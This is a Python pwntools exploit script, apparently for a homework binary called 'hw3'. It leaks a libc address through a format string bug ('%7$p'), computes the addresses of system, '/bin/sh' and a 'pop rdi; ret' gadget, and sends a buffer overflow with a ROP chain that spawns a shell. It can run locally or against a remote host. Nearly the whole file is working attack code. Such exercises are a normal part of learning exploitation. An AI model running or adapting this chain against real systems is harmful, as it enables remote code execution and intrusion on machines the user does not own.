#!/usr/bin/env python3
import time, os, traceback, sys, os
import pwn
import binascii, array
from textwrap import wrap

def start(srgv=[], *a, **kw):
  if pwn.args.GDB:
    return pwn.gdb.debug([binPath], gdbscript=gdbscript, *a, **kw, aslr=True)
  elif pwn.args.REMOTE:
    return pwn.remote(sys.argv[1], sys.argv[2], *a, **kw)
  else:
    return pwn.process([binPath], *a, **kw, aslr=True)


binPath="./hw3"
isRemote = pwn.args.REMOTE
gdbscript = '''
init-pwndbg
break *order+71
continue
'''.format(**locals())

pwn.context.log_level="debug"
elf = pwn.context.binary = pwn.ELF(binPath, checksec=False)
io = start()
io.recvuntil(b'Your selection >\n')
io.sendline(b'2')
io.sendline(b'%7$p') # Exploiting the format string vulnerability in the scanf function.
io.recvuntil(b'You entered> ')

#The the -second- item on the stack is the putchar offset which can be leaked by the '%7$p' string.
putchar_plus_115 = io.recvuntil(b'\n').strip().decode()
putchar_plus_115 = int(putchar_plus_115, 16) # converting string to int.
# PUTCHAR OFFSET : readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "putchar"
putchar_offset = 0x77a80
# Math to get the address of libc from putchar's offset
libc = putchar_plus_115 - 115 - putchar_offset
# BIN/SH OFFSET : strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
binsh_offset = 0x001b1117
# Searching ROP Gadget : ropper -f /lib/x86_64-linux-gnu/libc.so.6 --search "pop rdi; ret"
popRDI_offset = 0x2978d
# SYSTEM OFFSET : readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "system"
system_offset = 0x4a4e0
# Address calculation from offsets
binsh = libc + binsh_offset
popRDI = libc + popRDI_offset
system = libc + system_offset
# Packing the payload
tweety = pwn.p64(0xf007ba11f007ba11)
basicBuff = (b'\x90' * 72) + tweety

millennium_falcon = pwn.flat([
  basicBuff, # overflowing the buffer coded in the binary
  b'\x90' * 8, # NOPS added because rop gadget was not aligned with the return address
  popRDI, # ROP Gadget : pop rdi; ret
  binsh, # Pointer to 'bin/sh'
  system # System from libc
])


io.recvuntil(b'Your selection >\n')
io.sendline(b'1')
io.recvuntil(b'What would you like >\n')
io.sendline(millennium_falcon) # sending the payload after the "What would you like >"
io.interactive()